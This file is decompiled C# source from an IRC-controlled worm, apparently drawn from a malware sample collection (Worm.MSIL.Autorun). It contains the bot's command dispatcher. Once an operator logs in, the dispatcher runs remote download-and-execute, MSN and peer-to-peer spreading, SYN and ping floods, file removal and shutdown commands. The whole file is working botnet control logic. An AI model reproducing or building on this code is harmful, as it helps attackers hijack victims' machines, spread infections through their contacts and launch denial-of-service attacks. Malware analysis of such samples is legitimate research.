// Decompiled with JetBrains decompiler
// Type: explorer.messhandler
// Assembly: explorer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 56E5CD67-A795-400A-AA93-F7890471D495
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Worm.MSIL.Autorun.ig-2c86700b4d3a736629e63a7f91f6e488e611145530107c5a2b53ad8867079764.exe

namespace explorer
{
  internal class messhandler : handler
  {
    public override void messageReceived(string message, string user, string channel, irc irc)
    {
      string[] strArray;
      if (config.cmdPrefix.Length > 2)
        strArray = config.cmdPrefix.Split('*');
      else
        strArray = new string[1];
      strArray[0] = config.cmdPrefix;
      foreach (string str1 in strArray)
      {
        if (message.StartsWith(str1))
        {
          try
          {
            message = message.Substring(1);
          }
          catch
          {
          }
          string str2;
          if (message.Contains(" "))
          {
            str2 = message.Substring(0, message.IndexOf(" "));
            message = message.Substring(message.IndexOf(" ") + 1);
          }
          else
            str2 = message;
          foreach (string command in config.commands)
          {
            if (str2 == command)
            {
              if (command == "auth" & command == message)
                irc.teller.tell(config.channel, "Main", config.langauge_usystem_noinput_login.Replace("%user%", user), false, false, true);
              if (command == "auth" & !(command == message))
                irc.loginUser(user, message);
              if (command == "login" & !(command == message))
                irc.loginUser(user, message);
              if (command == "logout" & command == message)
                irc.logoutUser(user);
              if (irc.isLoggedIn(user))
              {
                if (command == "dl" & !(command == message))
                  config.cmdList.download(irc, message, user);
                if (command == "msn.msg" & !(command == message))
                  config.cmdList.msnstart(irc, message);
                if (command == "msn.stop")
                  config.cmdList.msnstop(irc);
                if (command == "ssyn.stop")
                  config.cmdList.ssynstop(irc);
                if (command == "ssyn.start")
                  config.cmdList.ssyn(irc, message);
                if (command == "ssyn")
                  config.cmdList.ssyn(irc, message);
                if (command == "ping.stop")
                  config.cmdList.pingstop(irc);
                if (command == "ping")
                  config.cmdList.ping(irc, message);
                if (command == "msn.msg" & command == message)
                  irc.teller.tell(config.channel, "Spreading-MSN", config.language_spreading_msn_noparms.Replace("%user%", user), false, false, true);
                if (command == "p2p")
                  config.cmdList.p2p(irc);
                if (command == "dl" & command == message)
                  irc.teller.tell(config.channel, "Download", config.language_download_error_noparms.Replace("%user%", user), false, false, true);
                if (command == "ver")
                  config.cmdList.version(irc, user);
                if (command == "visit" & !(command == message))
                  config.cmdList.exec(irc, message);
                if (command == "visit" & command == message)
                  irc.teller.tell(config.channel, "Exec", config.language_exec_error_noparms.Replace("%user%", user), false, false, true);
                if (command == "rm" & command == message)
                  irc.teller.tell(config.channel, "Remover", config.language_remove_noparms.Replace("%user%", user), false, false, true);
                if (command == "rm" & !(command == message))
                  config.cmdList.remove(irc, message, user);
                if (command == "about" & channel == irc.nick.ToLower())
                  config.cmdList.about(irc, user);
                if (command == "say" & !(command == message))
                  config.cmdList.say(message, irc);
                if (command == "exit" & command == message)
                  config.cmdList.exit(irc);
                if (command == "exit" & !(command == message))
                  config.cmdList.exit(message, irc);
              }
            }
          }
        }
      }
    }
  }
}
